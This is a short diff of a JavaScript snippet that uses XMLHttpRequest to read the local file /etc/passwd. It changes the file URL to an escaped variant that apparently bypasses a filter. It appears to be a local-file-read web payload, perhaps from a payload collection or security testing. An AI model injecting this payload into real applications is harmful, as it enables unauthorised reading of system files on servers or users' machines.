@@ -9,5 +9,5 @@ function reqListener () {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///etc/passwd"); 
+oReq.open("GET", "file://\/\/etc/passwd"); 
 oReq.send();
